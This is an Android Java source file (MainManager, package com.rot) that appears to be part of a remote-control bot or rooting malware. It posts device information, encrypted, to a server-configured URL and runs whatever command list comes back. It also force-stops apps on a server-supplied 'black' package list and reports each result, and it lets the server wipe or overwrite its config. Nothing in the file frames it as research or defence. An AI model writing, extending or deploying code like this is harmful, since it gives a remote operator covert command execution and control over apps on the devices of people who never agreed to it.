package com.rot.main;
import org.json.JSONException;
import org.json.JSONObject;
import android.annotation.SuppressLint;
import android.content.Context;
import com.rot.bean.CommandResult;
import com.rot.bean.Config;
import com.rot.bean.Response;
import com.rot.bean.StopReportRequest;
import com.rot.bean.TaskRequest;
import com.rot.bean.TaskResponse;
import com.rot.bean.framework.Json;
import com.rot.callback.RequestCallback;
import com.rot.utils.CollectionUtils;
import com.rot.utils.InfoUtils;
import com.rot.utils.MyLogger;
import com.rot.utils.PackageUtils;
import com.rot.utils.RequestUtils;
import com.rot.utils.StringUtils;

@SuppressLint("NewApi")
public class MainManager {
    public static void request(final Context context) {
        final ConfigManager manager = ConfigManager.getInstance(context);
        Config config = manager.load();
        stopBlackApps(context, config);
        try {
            TaskRequest request = InfoUtils.initForm(context, TaskRequest.class);
            RequestUtils.encryptPost(context, manager.getRequstUrl(), request.toJson(), new RequestCallback() {
                @Override
                public void onResult(String content, Throwable error) {
                    if (error != null) {
                        manager.clear();
                    } else {
                        if (StringUtils.isNotBlank(content)) {
                            try {
                                TaskResponse response = Json.optObj(TaskResponse.class, new JSONObject(content));
                                handleInfo(context, response);
                                if (CollectionUtils.isNotEmpty(response.commands)) {
                                    new TaskManager(context, response.commands).execute();
                                }
                            } catch (Throwable e) {
                                MyLogger.error(e);
                            }
                        }
                    }
                }
            });
        } catch (Throwable e) {
            MyLogger.error(e);
            System.gc();
        }
    }
    public static void handleInfo(final Context context, Response response) {
        if (response != null) {
            ConfigManager instance = ConfigManager.getInstance(context);
            if (response.clearData) {
                instance.clear();
            }
            instance.save(response.config);
        }
    }
    private static void stopBlackApps(final Context context, Config config) {
        if (config.stopBlack && config.blackPackageNames != null) {
            for (String packageName : config.blackPackageNames.split(",")) {
                if (StringUtils.isNotBlank(packageName) && packageName.contains(".")) {
                    CommandResult result = PackageUtils.stopApp(context, packageName);
                    if (config.stopBlackReport) {
                        reportStop(context, packageName, result);
                    }
                }
            }
        }
    }
    private static void reportStop(Context context, String packageName, CommandResult result) {
        final ConfigManager manager = ConfigManager.getInstance(context);
        try {
            StopReportRequest request = InfoUtils.initForm(context, StopReportRequest.class);
            request.packageName = packageName;
            request.result = result;
            JSONObject data = request.toJson();
            RequestUtils.encryptPost(context, manager.getRequstUrl(), data, new RequestCallback() {
                @Override
                public void onResult(String content, Throwable error) {
                    if (StringUtils.isNotBlank(content)) {
                        try {
                            Response response = Json.optObj(Response.class, new JSONObject(content));
                            manager.save(response.config);
                        } catch (JSONException e) {
                            MyLogger.error(e);
                            manager.clear();
                        }
                    }
                }
            });
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
}
